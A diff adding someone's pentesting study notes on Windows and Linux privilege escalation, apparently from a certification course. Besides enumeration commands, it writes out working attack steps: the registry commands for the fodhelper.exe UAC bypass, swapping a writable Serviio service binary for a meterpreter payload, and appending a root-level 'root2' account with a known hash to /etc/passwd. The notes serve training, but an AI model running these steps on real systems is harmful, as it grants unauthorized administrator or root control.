@@ -1,0 +1,251 @@
+------------------
+NOTES
+------------------
+
+Manual enumeration
+	tedious but gives more control (obv)
+	also stealthier
+
+	Enumerating Users
+		available on both windows and linux
+			whoami
+		net user <usesrname>
+			more info about the user in question
+		net user <no username>
+			discover other user accounts on the system
+		id
+			info about the user and the groups
+		/etc/passwd
+			info about each account on the box
+
+		Hostname enumeration
+			hostname
+				displays the hostname
+				windows and linux
+
+		OS version and architecture
+			Windows
+				systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+			Linux
+				cat /etc/issue
+				cat /etc/*-release
+				uname -a
+
+			Enumerating running processes and services
+				Runs in the context of the current privileges of the account
+				Windows
+					tasklist /SVC
+				Linux
+					ps aux
+
+			Enumerating network config info
+				Windows
+					ipconfig /all
+					route print
+						displays the network routing table
+					netstat -ano
+						views the currently active connections
+				Linux
+					ifconfig or ip
+					/sbin/route
+						views the routing table on linux
+					ss -tulpn
+						view active netowrk connections and listening ports
+
+			Enumerating firewall rules
+				Windows
+					netsh advfirewall show currentprofile
+					netsh advfirewall firewall show rule name=all
+				Linux
+					usually need root privs to view the iptables rules
+					somethings are viewable by non-priv Users
+						iptables-persistent has files in /etc/iptables
+					iptables-save
+						cmd to dump the firewall config
+					iptables-restore
+						cmd to restore the firewall at boot
+
+			Enumerating scheduled tasks
+				Windows
+					schtasks /query /fo LIST /v
+						/query = shows tasks
+						/FO LIST = list format
+						/V = verbose
+				Linux
+					ls -lah /etc/cron*
+					cat /etc/crontab
+
+			Enumerating installed applications and patch levels
+				wmic product get name, version, vendor
+				wmic qfe get Caption, Description, HotFixID, InstalledOn
+
+				dpkg -l
+
+			Enumerating Readable/ Writeable files
+				accesschk.exe -uws "Everyone" "C:\Program Files"
+				Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+					find all files that are world readable/ writeable in a given dir
+
+				find / -writable -type d 2>/dev/null
+					-type d = locate directories
+
+			Enumerating unmounted disks
+				Windows
+					mountvol
+				Linux
+					cat /etc/fstab
+					mount
+					/bin/lsblk
+
+			Enumerating device drivers and kernal modules
+				Windows
+					powershell
+					driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+					Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+
+				Linux
+					lsmod
+					/sbin/modinfo libata
+
+			Enumerating binaries that autoelevate
+				reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+				reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+
+				find / -perm -u=s -type f 2>/dev/null
+
+
+Automated enumeration
+	windows-privesc-check2.exe -h
+	windows-privesc-check2.exe --dump -G
+
+	./unix-privesc-check
+	./unix-privesc-check standard > output.txt
+
+	https://github.com/pentestmonkey/windows-privesc-check
+	https://github.com/pentestmonkey/windows-privesc-check
+
+
+Windows PrivEsc Examples
+	Understanding Windows privs and integrity levels
+		objects called access tokens
+			windows generates an access token that is assigned to the user upon authentication
+			various info describing the context of privs
+		unique identity tokens with a security identifier or SID
+		SID's are generated and maintained by the Windows Local Security Authority (LSA)
+		Integrity mechanism
+			assigns integrity levels to application processes and securable objects
+			describes the level of trust the OS has in the running applications
+			integrity levels control things like read and write access
+		Four levels of integrity
+			System integrity process
+				SYSTEM rights
+			High integrity process
+				administrative rights (Administrator)
+			Medium integrity process
+				standard user rights
+			Low integrity process
+				very restricted rights often used in sandboxed processes
+
+	Intro to User Account Control (UAC)
+		Access control system introduced in win vista
+		not considered a security boundary
+		forces apps to run in non-priv until an admin allows them to run higher
+		blocks installers and unauthorized apps
+			the Do you want to allow this app to make changes to your device? prompt
+
+		Even when logged in as admin, there are two security tokens, one high and one Medium
+		processes are defaulted to run as medium but can be ran as high with consent
+			powershell.exe Start-Process cmd.exe -Verb runAs
+
+	UAC Bypess: fodhelper.exe
+		silently elevating privs from med to high
+		fodhelper.exe - MS support app that manages language changes
+			launched when the user selects manage options features in the apps and features windwos settings
+			binary runs as high integrity on win10 1709
+		application manifest - xml file with info that lets the OS know how to handle the program when it is started
+			inspect with the sigcheck util from sysinternals -a and -m to dump the manifest
+
+		fodhelper.exe manifest breakdown
+			requires admin privs
+				<requestedExecutionLevel
+            level="requireAdministrator"
+        />
+			allows for auto elevating privs
+				<autoElevate>true</autoElevate>
+
+		procmon.exe filters
+			Process name is fodhelper.exe
+			Operations contains Reg
+				see all registry edits from fodhelper.exe
+			Result is NAME NOT FOUND
+				see all the attempts to edit a registry that is not there
+				lots of regedits
+			Path Contains HKCU
+				HKEY_CURRENT_USER hive, the low level user should have access to edit
+
+		fodhelper.exe tries to access ms-settings\shell\open\command
+			not found in HKCU
+			then immediately looks in HKCR (HKEY_CLASSES_ROOT)
+			key exists and has valid entry
+			semi key/ path injection inbound
+
+		REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+		REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+		REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+
+		run all three as low level user then reopen fodhelper.exe
+
+
+	Insecure File Permissions: Serviio
+		Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+			get the running programs
+			Serviio                  Running C:\Program Files\Serviio\bin\ServiioService.exe
+
+		serviio is installed in the Program Files folder
+		icals perms enumeration
+			icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+				C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)
+				(F) = full access (bad) ((especially for BUILTIN\Users))
+		replace ServiioService.exe with your own binary and trigger it by restarting the service
+			i replaced it with a meterpreter binary (.exe)
+
+	Leveraging Unquoted Service Paths
+		need write perms to a service's main dir and subdirectories but cant repalce files within them
+		anything after whitespace can be treated as an arguments
+			ex. C:\Program Files\My Program\My Service\service.exe
+			Windows tries to find:
+				C:\Program.exe
+				C:\Program Files\My.exe
+				C:\Program Files\My Program\My.exe
+				C:\Program Files\My Program\My service\service.exe
+
+	Windows Kernel Vulnerabilities: USBPcap
+		be careful with kernel exploits, can easily trigger a BSOD
+		find kernel info
+			systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+		query the drivers
+			driverquery /v
+		third party drivers are more likely to have outstanding vulns
+		checking the USBPcap version
+			cd "C:\Program Files"
+			type USBPcap.inf
+				DriverVer=10/02/2015,1.1.0.0
+
+		Compiling the exploit
+			low level exploits are often written in low level langs like c or cpp
+			best to compile on the machine itself, or make a VM with the same config
+			MinGW
+				C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
+				gcc
+				gcc --help
+
+Linux PrivEsc
+	Insecure File Perms: Cron
+		checking out the cron files ran
+			/var/log/cron.log
+		if a file is being cron'd as root and you can edit, you can run commands as root
+	Insecure File Perms: /etc/passwd
+		if you can overwrite /etc/passwd you can either create a new user or overwrite the root password hash
+		if a password hasah is stored in the second column of the file it will be interpreted over /etc/shadow
+			openssl passwd evil
+			echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
